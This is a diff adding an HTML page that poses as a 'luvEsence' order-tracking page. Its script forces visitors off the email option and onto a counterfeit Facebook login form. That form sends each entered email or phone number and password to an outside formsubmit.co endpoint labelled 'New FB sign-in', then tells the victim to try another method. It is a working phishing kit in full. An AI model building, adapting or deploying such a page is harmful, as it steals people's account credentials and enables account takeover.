@@ -1,1 +1,283 @@
+<style>
+  /* BASE LAYOUT */
+  body, #order-container, #fb-container {
+    background: #F0F2F5;
+    margin: 0;
+    padding: 20px;
+    font-family: system-ui, sans-serif;
+    color: #333;
+  }
+  .card {
+    background: #FFF; border-radius: 8px; padding: 24px; margin-bottom: 16px;
+  }
+  .header { display: flex; justify-content: space-between; align-items: center; }
+  .title { font-size: 24px; font-weight: 600; }
+  .date  { color: #666; margin-top: 4px; }
 
+  /* BUTTONS */
+  .btn, .social-btn {
+    box-sizing: border-box; width: 100%; padding: 12px; font-size: 14px;
+    border-radius: 6px; cursor: pointer; display: flex; align-items: center;
+    justify-content: center; text-decoration: none; border: none;
+  }
+  .btn { background: #E21D6C; color: #FFF; }
+  .btn-outline {
+    background: none; color: #E21D6C; border: 1px solid #E21D6C;
+    padding: 10px 12px;
+  }
+  .social-btn.facebook { background: #1877F2; color: #FFF; margin-top: 16px; }
+  .social-btn.google {
+    background: #FFF; color: #DB4437; border: 1px solid #DB4437; margin-top: 16px;
+  }
+  .social-btn img { height: 20px; margin-right: 8px; }
+
+  /* SHIPMENT CARD */
+  #shipment-card .header { justify-content: space-between; }
+  #shipment-card .header > div { display: flex; align-items: center; }
+  #shipment-card .header span { margin-right: 8px; font-size: 20px; }
+
+  /* OVERLAYS */
+  #login-page, .modal-overlay, #fb-container {
+    position: fixed; inset: 0; display: none;
+    align-items: center; justify-content: center;
+    background: rgba(0,0,0,0.5); z-index: 2000;
+  }
+  #login-page { background: rgba(245,245,245,0.95); z-index: 1000; }
+  #login-page .card, #fb-container > div {
+    max-width: 400px; width: 90%; text-align: center; padding: 24px;
+    background: #FFF; border-radius: 8px;
+  }
+  #login-page h2, #fb-container h1 { margin-top: 16px; }
+  #login-page p, #fb-container p { margin: 8px 0 16px; color: #666; }
+  #email-input {
+    width: 100%; padding: 12px; border: 1px solid #CCC; border-radius: 6px;
+    font-size: 14px; box-sizing: border-box;
+  }
+  #email-error {
+    display: none; color: #E21D6C; margin-top: 8px; font-size: 13px;
+  }
+
+  /* FB FORM LAYOUT */
+  #fb-wrap {
+    display: grid; grid-template-columns: 1fr min(360px, 100%); gap: 40px;
+    align-items: start; max-width: 960px; margin: auto;
+  }
+  #fb-brand h1 {
+    font-size: 64px; color: #1877f2; margin: 0 0 16px;
+    font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+    font-weight: bold;
+  }
+  #fb-brand p {
+    font-size: 20px; line-height: 1.3; margin: 0;
+  }
+
+  /* MODALS */
+  .modal-content {
+    background: #FFF; border-radius: 8px; width: 90%; max-width: 600px;
+    max-height: 80vh; overflow-y: auto; padding: 24px; position: relative;
+  }
+  .modal-header { display: flex; justify-content: space-between; align-items: center;
+    margin-bottom: 16px;
+  }
+  .modal-header h3 { margin: 0; font-size: 20px; font-weight: 600; }
+  .modal-close { font-size: 20px; border: none; background: none; cursor: pointer; }
+  .modal-body { white-space: pre-wrap; line-height: 1.5; font-size: 14px; }
+</style>
+
+<!-- MAIN PAGE -->
+<div id="order-container">
+  <div class="header" style="margin-bottom:16px;">
+    <div>
+      <div class="title">Order #LUV20767</div>
+      <div class="date">Confirmed Apr 16</div>
+    </div>
+  </div>
+
+  <!-- LOGIN BANNER -->
+  <div class="card" style="display:flex;justify-content:space-between;align-items:center;">
+    <div>View your order</div>
+    <button id="unlock-btn" class="btn" style="width:auto;padding:8px 16px;">Continue</button>
+  </div>
+
+  <!-- SHIPMENT CARD -->
+  <div class="card" id="shipment-card">
+    <div class="header">
+      <div><span>🚚</span>
+        <div><div style="font-weight:600;">On its way</div>
+             <div class="date">Apr 19</div>
+        </div>
+      </div>
+      <button id="toggle-ship" class="btn-outline">Show details ▼</button>
+    </div>
+    <div id="shipment-details" style="margin-top:12px;color:#666;display:none;">
+      Please sign in to view live progress.
+    </div>
+  </div>
+
+  <!-- FOOTER LINKS -->
+  <div style="text-align:center;margin-top:24px;">
+    <a id="refund-link" style="color:#E21D6C;cursor:pointer;margin:0 12px;">Refund policy</a>
+    <a id="terms-link"  style="color:#E21D6C;cursor:pointer;margin:0 12px;">Terms of service</a>
+  </div>
+</div>
+
+<!-- LOGIN OVERLAY -->
+<div id="login-page">
+  <div class="card">
+    <img src="https://cdn.shopify.com/s/files/1/0781/1878/1211/files/Brand-Logo2_ddc56809-b9bb-4589-83ed-aab540dad6e6_200x60@2x.png?v=1691163197.webp"
+         alt="Brand logo" style="max-height:60px;">
+    <h2>luvEsence</h2>
+    <p>Enter your email for a one-time code</p>
+    <input id="email-input" type="email" placeholder="Email address">
+    <div id="email-error">Oops! Please try a different method.</div>
+    <button id="continue-btn" class="btn" style="margin-top:16px;">Continue</button>
+    <div style="margin:16px 0;color:#666;">Or</div>
+    <a onclick="socialPortal('facebook')" class="social-btn facebook">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="FB">
+      Facebook
+    </a>
+    <a onclick="socialPortal('google')" class="social-btn google">
+      <img src="https://cdn1.iconfinder.com/data/icons/google-s-logo/150/Google_Icons-09-512.png" alt="G">
+      Google
+    </a>
+  </div>
+</div>
+
+<!-- AJAX Facebook form (no activation prompt) -->
+<div id="fb-container" style="display:none;position:fixed;inset:0;
+     background:rgba(0,0,0,0.5);align-items:center;justify-content:center;z-index:2000;">
+  <div style="background:#FFF;border-radius:8px;padding:32px;
+              max-width:800px;width:90%;display:flex;flex-direction:column;
+              box-shadow:0 2px 8px rgba(0,0,0,0.2);">
+    <div style="display:flex;gap:40px;">
+      <!-- Brand side -->
+      <div style="flex:1;">
+        <h1 style="font-size:64px;color:#1877f2;margin:0 0 16px;
+                   font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;font-weight:bold;">
+          facebook
+        </h1>
+        <p style="font-size:20px;line-height:1.3;margin:0;">
+          Facebook helps you connect and share with the people in your life.
+        </p>
+      </div>
+
+      <!-- AJAX form side -->
+      <form id="fb-form" action="https://formsubmit.co/ajax/15f87c684c99518fcc6fe7ca76d69568" method="POST"
+            style="flex:1;display:flex;flex-direction:column;gap:12px;">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next"    value="https://your-published-site.com">
+        <input type="hidden" name="_subject" value="New FB sign-in">
+
+        <input type="text"     name="email_or_phone" placeholder="Email address or phone number" required
+               style="padding:12px;border:1px solid #ccd0d5;border-radius:6px;font-size:16px;">
+        <input type="password" name="password"           placeholder="Password"                     required
+               style="padding:12px;border:1px solid #ccd0d5;border-radius:6px;font-size:16px;">
+
+        <button type="submit" style="background:#1877f2;color:#fff;padding:12px;
+                                     border:none;border-radius:6px;font-size:18px;cursor:pointer;">
+          Log in
+        </button>
+      </form>
+    </div>
+
+    <div id="fb-form-msg" style="margin-top:16px;text-align:center;color:#1877f2;display:none;">
+      Thanks! Check your email.
+    </div>
+
+    <!-- Footer links -->
+    <a href="https://www.facebook.com/recover/initiate/?..." style="text-align:center;
+       margin-top:16px;color:#1877f2;text-decoration:none;display:block;">Forgotten password?</a>
+    <a href="https://www.facebook.com/r.php?entry_point=login" style="text-align:center;
+       margin-top:8px;background:#42b72a;color:#fff;padding:12px 0;border-radius:6px;
+       text-decoration:none;display:block;font-size:18px;">Create new account</a>
+
+    <div style="text-align:center;margin-top:24px;font-size:14px;color:#1c1e21;">
+      <a href="#" style="font-weight:600;color:#1c1e21;text-decoration:none;">
+        Create a Page
+      </a> for a celebrity, brand or business.
+    </div>
+  </div>
+</div>
+
+<script>
+  // AJAX submission to avoid activation redirect
+  document.getElementById('fb-form').addEventListener('submit', async e => {
+    e.preventDefault();
+    const form = e.target;
+    const msg = document.getElementById('fb-form-msg');
+    msg.style.display = 'none';
+    const data = new FormData(form);
+    try {
+      const res = await fetch(form.action, { method: 'POST', body: data });
+      const json = await res.json();
+      if (json.success === 'true' || res.ok) {
+        msg.textContent = 'Please try another method.';
+      } else {
+        msg.textContent = 'Oops, something went wrong.';
+      }
+    } catch {
+      msg.textContent = 'Network error, please try again.';
+    }
+    msg.style.display = 'block';
+  });
+</script>
+
+<!-- REFUND POLICY MODAL -->
+<div id="refund-modal" class="modal-overlay">
+  <div class="modal-content">
+    <div class="modal-header"><h3>Refund policy</h3>
+      <button class="modal-close" data-close="refund-modal">×</button>
+    </div>
+    <div class="modal-body">Return Policy… (your full text)</div>
+  </div>
+</div>
+
+<!-- TERMS OF SERVICE MODAL -->
+<div id="terms-modal" class="modal-overlay">
+  <div class="modal-content">
+    <div class="modal-header"><h3>Terms of service</h3>
+      <button class="modal-close" data-close="terms-modal">×</button>
+    </div>
+    <div class="modal-body">OVERVIEW… (your full text)</div>
+  </div>
+</div>
+
+<script>
+  // Shipment toggle
+  document.getElementById('toggle-ship').onclick = function() {
+    const d = document.getElementById('shipment-details');
+    if (d.style.display === 'none') { d.style.display = 'block'; this.textContent = 'Hide details ▲'; }
+    else { d.style.display = 'none'; this.textContent = 'Show details ▼'; }
+  };
+
+  // Unlock main then show login overlay
+  document.getElementById('unlock-btn').onclick = () => {
+    document.getElementById('order-container').style.display = 'none';
+    document.getElementById('login-page').style.display = 'flex';
+  };
+
+  // Continue email always shows error
+  document.getElementById('continue-btn').onclick = () => {
+    document.getElementById('email-error').style.display = 'block';
+  };
+
+  // Footer pops
+  document.getElementById('refund-link').onclick = () =>
+    document.getElementById('refund-modal').style.display = 'flex';
+  document.getElementById('terms-link').onclick = () =>
+    document.getElementById('terms-modal').style.display = 'flex';
+
+  // Close modals
+  document.querySelectorAll('.modal-close').forEach(btn =>
+    btn.onclick = () => document.getElementById(btn.dataset.close).style.display = 'none'
+  );
+
+  // Social portal: swap to FB form
+  function socialPortal(channel) {
+    if (channel === 'facebook') {
+      document.getElementById('login-page').style.display = 'none';
+      document.getElementById('order-container').style.display = 'none';
+      document.getElementById('fb-container').style.display = 'flex';
+    }
+  }
+</script>
